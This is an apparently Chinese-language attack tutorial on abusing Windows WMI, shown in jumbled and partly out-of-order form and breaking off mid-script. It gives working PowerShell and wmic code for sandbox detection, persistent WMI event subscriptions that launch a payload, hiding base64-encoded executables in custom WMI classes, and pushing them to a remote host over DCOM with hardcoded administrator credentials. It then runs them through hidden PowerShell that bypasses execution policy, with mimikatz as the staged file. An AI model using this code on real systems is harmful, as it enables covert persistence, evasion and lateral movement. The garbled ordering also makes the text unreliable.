可通过内存与处理器的数量来判断是否为VM/Sandbox ，不排除高配置的VM/Sandbox 
WMI Attacks – VM/Sandbox Detection (VMware)
如果VM/Sandbox 是VMware 的产品，可以从Vmware的一些特征查询：
在Powershell 中是这样的：
后面不在啰嗦， 只要理解这个类的查询逻辑，就很容易理解命令 ， Get-WmiObject 本质上也是
使用了WQL查询，并且 也支持 -query 参数直接使用WQL查询。
SELECT * FROM Win32_ComputerSystem WHERE TotalPhysicalMemory = 240 AND TargetInstance.SystemUpTime < 325"
#Flter 可以尝试使用其他事件
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace 
"root\subscription" -Arguments 
@{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} 
-ErrorAction Stop
#Event Filter
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 
"root\subscription" -Arguments 
@{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
#Event Consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" 
-Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
#Filter to Consumer Binding
#需管理员权限
适用Process Explorer 监控发现 calc.exe  进程在启动之后，自动结束进程，目前稳定性尚未明确，如
果使用来上线，做好进程迁移。
如何删除？
以上是利用 WMI 进行 Persistence 的核心逻辑，很容易找到以下写好的Powershell 脚本：
WMI-Persistence.ps1
Remove-CimInstance -Query "Select * from __EventFilter where  Name = 
'EventFilter'" -Namespace "root\subscription"
#删除WMIEventFilter
Remove-CimInstance -Query "SELECT * FROM CommandLineEventConsumer WHERE 
Name='consumerName'" -Namespace "root\subscription"
#删除WMIEventConsumer 
#删除FilterToConsumerBinding发现CIM cmdlets 报错，暂不明确原因，适用WMI cmdlets 解决
Get-WmiObject -Class  __FilterToConsumerBinding -Namespace "root\subscription" -
Filter "Consumer='CommandLineEventConsumer.Name=\'ConsumerName\''" |Remove-
WmiObject -Verbose
这里代码太多，直接给了图片，整个脚本逻辑很清晰，只有3个函数 Install-Persistence、Remove-
Persistence、Check-WMI，功能和函数名相同，实际使用时仅需要修改 $Payload  值即可持久化上
线。
Powershell并不是唯一的选择，wmic 中也能实现相同的效果：
WMI Attacks – Data Storage
如何查看其中的值：
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE 
Name="EventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", 
Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance 
ISA 'Win32_PerfFormattedData_PerfOS_System'"
#WMI EventFilter
#系统启动 60秒后触发
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE 
Name="ConsumerName", 
ExecutablePath="C:\Windows\System32\calc.exe",CommandLineTemplate="C:\Windows\Sy
stem32\calc.exe"
#WMI Event Consumer
#我这里我启动的是calc
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE 
Filter="__EventFilter.Name=\"EventFilter\"", 
Consumer="CommandLineEventConsumer.Name=\"ConsumerName\""
#WMI Event FilterToConsumerBinding
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_EvilClass'
$StaticClass.Put()
$StaticClass.Properties.Add('EvilProperty',"This is not the malware you're 
looking for")
$StaticClass.Put() 
#新建本地类存储
#需管理员权限
([WmiClass] 'Win32_EvilClass').Properties['EvilProperty']
#具体的获取Value的值
([WmiClass] 'Win32_EvilClass').Properties['EvilProperty'].value
具体的应用：
WMI Attacks – C2 Communication (WMI Class) – “Push” Attack
$LocalFilePath = "C:\Windows\System32\calc.exe"
$FileBytes = [IO.File]::ReadAllBytes($LocalFilePath)
$EncodedFileContentsToDrop = [Convert]::ToBase64String($FileBytes)
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_EvilClass'
$StaticClass.Put()
$StaticClass.Properties.Add('EvilProperty',$EncodedFileContentsToDrop)
$StaticClass.Put() 
$EncodedPayload=([WmiClass]'Win32_EvilClass').Properties['EvilProperty'].value
#将calc Base64吹后存储在Win32_evilClass 的 EvilProperty 中
#怎么执行？
#这里给出两种执行方式，推荐存储的是powershell脚本，否则执行可能会遇到问题
$PowerShellPayload = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -
WindowStyle Hidden -enc $EncodedPayload"
Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList 
$PowerShellPayload
$PowerShellPayload = "cmd /k $EncodedPayload"
Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList 
$PowerShellPayload
# Prep file to drop on remote system
$LocalFilePath = 'C:\Windows\System32\calc.exe'
#当然这个路径可以设置一个网络上的路径
$FileBytes = [IO.File]::ReadAllBytes($LocalFilePath)
$EncodedFileContentsToDrop = [Convert]::ToBase64String($FileBytes)
# Establish remote WMI connection
$Options = New-Object Management.ConnectionOptions
和上面的Data Storage 相似，不过这里是通过DCOM 远程连接，写入到远程主机的 Class 的 
Properties 中，
注：笔者未复现成功，但是@九世成功了，我的系统是Win 10 1809 ，他的系统大概是Windows 
Server 2008 R2
不要误会这一节的标题，这里本意是使用利用WMI 构造C2 （下同），但我这里代码的用途仅仅是通过 
Class 的 Properties  储存数据。
参考：WMI Backdoor
务必阅读这篇，该篇说的更为详细
$Options.Username = '0day\Administrator'
$Options.Password = 'Admin!@#45'
$Options.EnablePrivileges = $True
$Connection = New-Object Management.ManagementScope
$Connection.Path = '\\192.168.3.142\root\default'
$Connection.Options = $Options
$Connection.Connect()
# "Push" file contents
$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, 
$null)
$EvilClass['__CLASS'] = 'Win32_EvilClass'
$EvilClass.Properties.Add('EvilProperty', [Management.CimType]::String, $False)
$EvilClass.Properties['EvilProperty'].Value = $EncodedFileContentsToDrop
$EvilClass.Put()
$EncodedPayload=([WmiClass] 'Win32_EvilClass').Properties['EvilProperty'].value
$PowerShellPayload = "cmd /k $EncodedPayload"
Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList 
$PowerShellPayload
#需要再 192.168.3.142 上执行，如果通过远程读取，需要对应用户凭据
([WmiClass]'\\192.168.3.142:Win32_EvilClass').Properties['EvilProperty'].value
#另外笔者测试手里，如果目标是powershell脚本，推荐是使用下面的代码
$EncodedPayload=([WmiClass] 'Win32_Command').Properties['EvilProperty'].Value
#PowerShell执行命令
$PowerShellPayload = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -
WindowStyle Hidden -enc $EncodedPayload"
Invoke-WmiMethod  -Class Win32_Process -Name Create -ArgumentList 
$PowerShellPayload
#完整的代码，
# Prep file to drop on remote system
$LocalFilePath=’C:\Users\jerry\mimikatz.exe’
$FileBytes=[IO.File]::ReadAllBytes($LocalFilePath)
$EncodedFileContentsToDrop=[Convert]::ToBase64String ($FileBytes)
# Establish remote WMI connection
$Options=New-ObjectManagement.ConnectionOptions
$Options.Username =’0day\Administrator’